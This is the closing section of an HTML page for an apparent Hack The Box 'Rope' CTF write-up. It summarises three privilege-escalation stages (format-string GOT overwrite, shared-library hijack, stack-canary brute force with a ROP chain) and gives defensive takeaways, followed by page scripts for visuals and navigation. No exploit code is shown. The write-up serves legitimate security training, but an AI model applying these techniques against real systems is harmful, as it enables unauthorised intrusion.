+          Rope is a masterclass in progressive binary exploitation. Each escalation stage requires a different exploitation primitive, and the difficulty ramps up significantly from one user to the next. Here's a recap of the key techniques:
+        </p>
+
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Stage</th><th>User</th><th>Technique</th><th>Key Challenge</th></tr></thead>
+            <tbody>
+              <tr><td>1</td><td>john</td><td>Format String → GOT Overwrite</td><td>PIE bypass via memory leak</td></tr>
+              <tr><td>2</td><td>r4j</td><td>Shared Library Hijack</td><td>Identifying world-writable liblog.so</td></tr>
+              <tr><td>3</td><td>root</td><td>Buffer Overflow → ROP Chain</td><td>Fork-based canary brute force (3 stages)</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <p>
+          The box teaches several important lessons for both offensive and defensive security practitioners. From an offensive perspective, it reinforces that format strings are not just information leaks — they're arbitrary write primitives when combined with Partial RELRO. The fork-based brute force technique is a classic that every pwn practitioner should have in their toolkit. From a defensive perspective, the misconfigurations are instructive: world-writable shared libraries in sudo-allowed binaries, custom webservers with trivial directory traversal, and network services that fork without re-randomizing canaries.
+        </p>
+
+        <div class="callout info">
+          <div class="callout-icon">&#x2139;</div>
+          <div class="callout-body">
+            <p><strong>Key Takeaways:</strong> Always check RELRO when considering GOT overwrites. Fork-based servers are vulnerable to canary brute forcing. Shared library permissions in sudo chains are a critical audit point. And never underestimate the power of a simple format string bug.</p>
+          </div>
+        </div>
+      </div>
+
+    </main>
+
+    <!-- ── TOC Sidebar ──────────────────────────────── -->
+    <aside class="toc-sidebar">
+      <div class="toc-title">On This Page</div>
+      <ul class="toc-list" id="toc-list">
+        <li><a href="#overview">Overview</a></li>
+        <li><a href="#recon">Recon</a></li>
+        <li><a href="#shell-john">Shell as john</a></li>
+        <li class="sub"><a href="#directory-traversal">Directory Traversal</a></li>
+        <li class="sub"><a href="#httpserver-analysis">httpserver Analysis</a></li>
+        <li class="sub"><a href="#format-string">Format String Vulnerability</a></li>
+        <li class="sub"><a href="#memory-leak">Memory Leak</a></li>
+        <li class="sub"><a href="#exploit-script-john">Exploit Script</a></li>
+        <li><a href="#shell-r4j">Shell as r4j</a></li>
+        <li class="sub"><a href="#r4j-enum">Enumeration</a></li>
+        <li class="sub"><a href="#liblog-hijack">liblog.so Hijack</a></li>
+        <li><a href="#shell-root">Shell as root</a></li>
+        <li class="sub"><a href="#port-1337">Port 1337</a></li>
+        <li class="sub"><a href="#binary-analysis">Binary Analysis</a></li>
+        <li class="sub"><a href="#brute-force-strategy">Brute Force Strategy</a></li>
+        <li class="sub"><a href="#stage-0">Stage 0 — Canary Brute Force</a></li>
+        <li class="sub"><a href="#stage-1">Stage 1 — Libc Leak</a></li>
+        <li class="sub"><a href="#stage-2">Stage 2 — Root Shell</a></li>
+        <li class="sub"><a href="#full-exploit-root">Full Exploit Code</a></li>
+        <li><a href="#summary">Summary</a></li>
+      </ul>
+    </aside>
+  </div>
+
+  <!-- Footer -->
+  <footer class="site-footer">
+    <p>&copy; 2026 QA210 — Hack The Box Writeups &amp; CTF Solutions</p>
+  </footer>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ -->
+<!-- Three.js Background — TorusKnot (rope/knot theme) -->
+<!-- ═══════════════════════════════════════════════════ -->
+<script>
+(function() {
+  const canvas = document.getElementById('three-bg');
+  const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+  renderer.setSize(window.innerWidth, window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 0.1, 1000);
+  camera.position.z = 30;
+
+  // TorusKnot geometry — rope/knot theme
+  const geo = new THREE.TorusKnotGeometry(8, 2.2, 200, 32, 2, 3);
+  const mat = new THREE.MeshBasicMaterial({
+    color: 0x10b981,
+    wireframe: true,
+    transparent: true,
+    opacity: 0.08
+  });
+  const knot = new THREE.Mesh(geo, mat);
+  scene.add(knot);
+
+  // Secondary smaller knot
+  const geo2 = new THREE.TorusKnotGeometry(5, 1.5, 150, 24, 3, 5);
+  const mat2 = new THREE.MeshBasicMaterial({
+    color: 0x34d399,
+    wireframe: true,
+    transparent: true,
+    opacity: 0.05
+  });
+  const knot2 = new THREE.Mesh(geo2, mat2);
+  knot2.rotation.x = Math.PI / 3;
+  scene.add(knot2);
+
+  function animate() {
+    requestAnimationFrame(animate);
+    knot.rotation.x += 0.001;
+    knot.rotation.y += 0.0015;
+    knot2.rotation.x -= 0.0012;
+    knot2.rotation.z += 0.0008;
+    renderer.render(scene, camera);
+  }
+  animate();
+
+  window.addEventListener('resize', () => {
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+  });
+})();
+</script>
+
+<!-- ═══════════════════════════════════════════════════ -->
+<!-- TOC Active Highlight + Copy Buttons                -->
+<!-- ═══════════════════════════════════════════════════ -->
+<script>
+// ── Copy button ──────────────────────────────────────
+function copyCode(btn) {
+  const codeBlock = btn.closest('.code-block');
+  const codeEl = codeBlock.querySelector('code');
+  const text = codeEl.textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'Copied!';
+    btn.classList.add('copied');
+    setTimeout(() => {
+      btn.textContent = 'Copy';
+      btn.classList.remove('copied');
+    }, 2000);
+  });
+}
+
+// ── TOC active highlighting ──────────────────────────
+(function() {
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const sections = [];
+  tocLinks.forEach(link => {
+    const id = link.getAttribute('href').slice(1);
+    const el = document.getElementById(id);
+    if (el) sections.push({ id, el, link });
+  });
+
+  function updateTOC() {
+    let current = sections[0];
+    for (const sec of sections) {
+      const rect = sec.el.getBoundingClientRect();
+      if (rect.top <= 120) current = sec;
+    }
+    tocLinks.forEach(l => l.classList.remove('active'));
+    if (current) current.link.classList.add('active');
+  }
+
+  window.addEventListener('scroll', updateTOC, { passive: true });
+  updateTOC();
+})();
+
+// ── Re-highlight Prism after DOM ready ───────────────
+document.addEventListener('DOMContentLoaded', () => {
+  Prism.highlightAll();
+});
+</script>
+
+</body>
+</html>
